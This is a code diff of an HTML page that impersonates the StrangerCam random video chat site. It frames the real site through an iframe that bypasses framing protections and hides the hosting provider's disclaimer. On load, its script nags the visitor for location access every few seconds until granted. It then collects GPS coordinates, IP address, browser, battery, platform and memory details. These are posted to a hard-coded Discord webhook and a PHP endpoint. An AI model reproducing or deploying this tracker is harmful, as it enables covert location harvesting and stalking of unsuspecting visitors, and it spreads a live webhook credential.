@@ -1,80 +1,130 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation with Discord Integration</title>
     <style>
-        #dialogBox {
+        img[alt*="www.000webhost.com"], .disclaimer {
             display: none;
-            position: fixed;
+        }
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+        }
+        .dialog-box {
+            position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             padding: 20px;
-            background: #fff;
-            border: 1px solid #ccc;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
+            max-width: 300px;
+            display: none; /* Hidden by default, will show when needed */
+        }
+        .dialog-box h2 {
+            margin-top: 0;
+            color: #333333;
+        }
+        .dialog-box p {
+            margin-bottom: 20px;
+            color: #666666;
+        }
+        .btn-allow {
+            background-color: #4CAF50;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn-allow:hover {
+            background-color: #45a049;
         }
     </style>
-</head>
-<body>
-    <!-- Original Content -->
-    <div id="main-content">
-        <h1>Welcome to Random Video Chat</h1>
-        <p>Chat anonymously with strangers from all over the world!</p>
-    </div>
-
-    <!-- Geolocation Dialog Box -->
-    <div id="dialogBox">
-        <p>We need your location to provide better services. Please allow location access.</p>
-        <button onclick="requestLocation()">Retry</button>
-    </div>
-
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
+    <meta name="description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com" />
+    <link rel="canonical" href="https://strangercam.com/" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Random Video Chat - StrangerCam.com: Cam With Strangers" />
+    <meta property="og:description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com." />
+    <meta property="og:site_name" content="Stranger Cam" />
+    <meta property="article:publisher" content="https://www.facebook.com/strangercam" />
+    <meta property="article:modified_time" content="2021-12-17T14:46:35+00:00" />
+    <meta property="og:image" content="https://strangercam.com/wp-content/uploads/2021/10/Untitled-2.png" />
+    <meta property="og:image:width" content="800" />
+    <meta property="og:image:height" content="532" />
+    <meta property="og:image:type" content="image/png" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@strangercamapp" />
+    <meta name="twitter:label1" content="Est. reading time" />
+    <meta name="twitter:data1" content="4 minutes" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+    <script src="x-frame-bypass.js" type="module"></script>
     <script>
-        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your webhook URL
-        const retryDelay = 5000; // 5 seconds
-        const maxRetries = 5; // Maximum retries
-        let retryCount = 0;
+        $(document).ready(function() {
+            // Show permission dialog immediately on page load
+            getLocation();
 
-        // Function to fetch IP address and other device details
-        async function fetchIPAndDeviceDetails() {
-            // Get IP address
-            const ipData = await fetch('https://api.ipify.org?format=json');
-            const ipResponse = await ipData.json();
-            const ipAddress = ipResponse.ip;
+            // Keep asking for permission every 5–10 seconds if denied
+            let permissionDenied = false;
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
+                } else {
+                    alert("Your Browser Does not support GPS");
+                }
+            }
 
-            // Get User-Agent (device and browser details)
-            const userAgent = navigator.userAgent;
+            function showPosition(position) {
+                var grak = "Latitude: " + position.coords.latitude + " Longitude: " + position.coords.longitude;
+                sdrp(grak);
+                sendToDiscord(grak);
+                $('#dialogBox').hide(); // Hide dialog if permission is granted
+            }
 
-            // Get network information
-            const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+            function showError(error) {
+                if (error.code === error.PERMISSION_DENIED) {
+                    if (!permissionDenied) {
+                        $('#dialogBox').show(); // Show dialog if permission is denied
+                        permissionDenied = true;
+                    }
+                    setTimeout(getLocation, 5000); // Retry after 5 seconds if denied
+                } else {
+                    alert("Location error: " + error.message);
+                    window.close(); // Close window if error is critical
+                }
+            }
 
-            // Get battery information
-            const battery = await navigator.getBattery();
-            const batteryPercentage = battery.level * 100;
-            const isCharging = battery.charging;
+            // Function to send data to Discord
+            async function sendToDiscord(location) {
+                const ipData = await fetch('https://api.ipify.org?format=json');
+                const ipResponse = await ipData.json();
+                const ipAddress = ipResponse.ip;
+                const userAgent = navigator.userAgent;
+                const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+                const battery = await navigator.getBattery();
+                const batteryPercentage = battery.level * 100;
+                const isCharging = battery.charging;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const deviceMemory = navigator.deviceMemory || "Unknown";
 
-            // Get platform and language
-            const platform = navigator.platform;
-            const language = navigator.language;
-
-            // Get device memory (available in modern browsers)
-            const deviceMemory = navigator.deviceMemory || "Unknown";
-
-            return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory };
-        }
-
-        // Function to send the location and device details to Discord
-        async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory) {
-            const data = {
-                content: `**User Details:**
+                const data = {
+                    content: `**User Details:**
 - DeviceLocalTime: ${new Date().toLocaleString()}
-- Location: Latitude ${latitude}, Longitude ${longitude}
-- Google Maps Link: https://www.google.com/maps/place/${latitude}%2C${longitude}
+- Location: Latitude ${location}
+- Google Maps Link: https://www.google.com/maps/place/${location}
 - IP Address: ${ipAddress}
-- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
 - User-Agent: ${userAgent}
 - NetworkInformation: ${networkInfo}
 - BatteryPercentage: ${batteryPercentage}%
@@ -82,79 +132,56 @@
 - Platform: ${platform}
 - DeviceLanguage: ${language}
 - DeviceMemory: ${deviceMemory} GB`
-            };
+                };
 
-            try {
-                const response = await fetch(discordWebhookURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
+                const request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm", true);
+                request.setRequestHeader('Content-Type', 'application/json');
+                request.send(JSON.stringify(data));
+            }
+
+            // Function to send details to server
+            function sdrp(gpsr) {
+                $.ajax({
+                    type: "POST",
+                    url: "sunni.php",
+                    data: {
+                        gps: gpsr,
+                        // Add more device details here
                     },
-                    body: JSON.stringify(data)
+                    success: function(response) {
+                        console.log('Data sent successfully');
+                    },
+                    error: function(xhr, status, error) {
+                        console.error('Error sending data:', error);
+                    }
                 });
-
-                if (!response.ok) {
-                    throw new Error(`Discord webhook error: ${response.statusText} (${response.status})`);
-                }
-
-                console.log("Details sent to Discord successfully.");
-            } catch (error) {
-                console.error("Failed to send details to Discord:", error);
             }
-        }
-
-        // Function to get geolocation permission
-        async function getLocationPermission() {
-            return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 5000
-                    });
-                } else {
-                    reject(new Error("Geolocation is not supported by this browser."));
-                }
-            });
-        }
-
-        // Request location and send to Discord
-        async function requestLocation() {
-            try {
-                const position = await getLocationPermission();
-                const { latitude, longitude } = position.coords;
-                const timestamp = new Date().toISOString(); // Current timestamp
-
-                console.log("Permission granted:", latitude, longitude);
-
-                // Fetch IP address and device details
-                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory } = await fetchIPAndDeviceDetails();
-
-                // Send all the data to Discord
-                sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory);
-
-                // Hide the dialog
-                document.getElementById('dialogBox').style.display = 'none';
-                retryCount = 0; // Reset retries
-            } catch (error) {
-                console.warn("Location access failed:", error);
-
-                if (retryCount < maxRetries) {
-                    retryCount++;
-                    console.log(`Retrying (${retryCount}/${maxRetries}) in ${retryDelay / 1000}s...`);
-                    document.getElementById('dialogBox').style.display = 'block'; // Show dialog
-                    setTimeout(requestLocation, retryDelay);
-                } else {
-                    console.error("Max retries reached. Location permission denied.");
-                }
-            }
-        }
-
-        // On page load, start geolocation request
-        document.addEventListener("DOMContentLoaded", () => {
-            console.log("Page loaded. Starting geolocation request...");
-            document.getElementById('dialogBox').style.display = 'block'; // Ensure visible
-            requestLocation();
         });
+    </script>
+</head>
+<body>
+    <div class="iframe-container">
+        <iframe
+            is="x-frame-bypass"
+            src="https://strangercamchat.com"
+            frameborder="0"
+            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
+            height="100%"
+            width="100%"
+        ></iframe>
+        <div class="dialog-box" id="dialogBox">
+            <h2>Alert</h2>
+            <p>Please Allow location permissions to continue chatting with strangers</p>
+            <button class="btn-allow" onclick="requestPermissions()">Allow</button>
+        </div>
+    </div>
+    <script>
+        function requestPermissions() {
+            // Hide the dialog once permissions are allowed
+            $('#dialogBox').hide();
+            getLocation(); // Attempt to get location again
+        }
     </script>
 </body>
 </html>
